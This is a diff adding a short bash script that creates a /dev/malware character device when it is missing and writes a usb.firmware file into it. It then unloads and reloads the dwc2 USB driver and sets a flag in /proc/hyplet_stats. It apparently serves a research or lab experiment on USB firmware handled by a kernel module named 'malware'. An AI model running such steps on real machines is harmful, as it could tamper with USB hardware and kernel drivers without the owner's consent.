@@ -1,0 +1,12 @@
+#!/bin/bash
+DOES_DEVICE_EXIST=$(ls -l /dev/ | grep malware | wc -l)
+
+if [[ $DOES_DEVICE_EXIST == 0 ]]; then
+    NODE_MAJOR=$(grep malware /proc/devices | cut -d " " -f1)
+    mknod /dev/malware c $NODE_MAJOR 0
+fi
+
+cat usb.firmware > /dev/malware
+rmmod dwc2
+echo 1 > /proc/hyplet_stats
+modprobe dwc2
